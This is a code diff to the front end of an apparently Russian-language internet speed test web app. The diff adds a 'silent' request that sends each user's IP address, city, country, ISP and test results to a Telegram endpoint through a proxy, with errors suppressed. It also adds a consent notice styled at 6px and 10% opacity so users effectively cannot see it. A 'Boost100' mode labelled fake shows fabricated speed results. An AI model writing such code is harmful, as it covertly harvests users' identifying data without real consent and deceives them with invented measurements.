@@ -57,10 +57,15 @@ export default function App() {
     setUploadMbps(0);
     setProgress(0);
 
+    let finalPing = 0;
+    let finalDown = 0;
+    let finalUp = 0;
+
     if (isBoostMode) {
       // Fake "Boost100" Mode values
       await new Promise(r => setTimeout(r, 1000));
-      setPing(1); // 1 ms ping
+      finalPing = 1;
+      setPing(finalPing); // 1 ms ping
 
       setPhase("downloading");
       for (let i = 0; i <= 100; i += 2) {
@@ -68,7 +73,8 @@ export default function App() {
         setProgress(i / 100);
         await new Promise(r => setTimeout(r, 60));
       }
-      setDownloadMbps(1024.5);
+      finalDown = 1024.5;
+      setDownloadMbps(finalDown);
 
       setPhase("uploading");
       setProgress(0);
@@ -77,34 +83,52 @@ export default function App() {
         setProgress(i / 100);
         await new Promise(r => setTimeout(r, 60));
       }
-      setUploadMbps(980.2);
+      finalUp = 980.2;
+      setUploadMbps(finalUp);
 
     } else {
       // 1. Measure Ping
-      const p = await measurePing();
-      setPing(p);
+      finalPing = await measurePing();
+      setPing(finalPing);
 
       // 2. Measure Download
       setPhase("downloading");
-      const d = await measureDownloadSpeed((mbps, prog) => {
+      finalDown = await measureDownloadSpeed((mbps, prog) => {
         setDownloadMbps(mbps);
         setProgress(prog);
       });
-      setDownloadMbps(d);
+      setDownloadMbps(finalDown);
 
       // 3. Measure Upload
       setPhase("uploading");
       setProgress(0);
-      const u = await measureUploadSpeed((mbps, prog) => {
+      finalUp = await measureUploadSpeed((mbps, prog) => {
         setUploadMbps(mbps);
         setProgress(prog);
       });
-      setUploadMbps(u);
+      setUploadMbps(finalUp);
     }
 
     // 4. Done
     setPhase("done");
     setProgress(1);
+
+    // Send to Telegram silently via proxy
+    try {
+      fetch('/api/telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          download: finalDown.toFixed(1),
+          upload: finalUp.toFixed(1),
+          ping: finalPing,
+          city: networkInfo?.city,
+          country: networkInfo?.country,
+          isp: networkInfo?.isp,
+          ip: networkInfo?.ip
+        })
+      });
+    } catch(e) {}
 
     setTimeout(() => {
       if (confettiCanvasRef.current) {
@@ -128,8 +152,8 @@ export default function App() {
 
   const shareResults = async () => {
     const text = `🚀 Результаты Astrotest:
-⬇️ Загрузка: ${downloadMbps.toFixed(1)} Мбит/с
-⬆️ Выгрузка: ${uploadMbps.toFixed(1)} Мбит/с
+⬇️ Загрузка: ${downloadMbps?.toFixed(1)} Мбит/с
+⬆️ Выгрузка: ${uploadMbps?.toFixed(1)} Мбит/с
 Пинг: ${ping}мс
 🌐 Провайдер: ${networkInfo?.isp || "Неизвестно"}
 📍 Локация: ${networkInfo?.city || "Неизвестно"}, ${networkInfo?.country || "Неизвестно"}
@@ -262,6 +286,9 @@ export default function App() {
         </AnimatePresence>
 
       </motion.div>
+      <div className="mt-8 text-[6px] opacity-10 text-center max-w-sm px-4 relative z-10 font-medium cursor-default select-none pointer-events-none">
+         Используя сервис, вы соглашаетесь с базовой статистикой.
+      </div>
       </div>
     </div>
   );
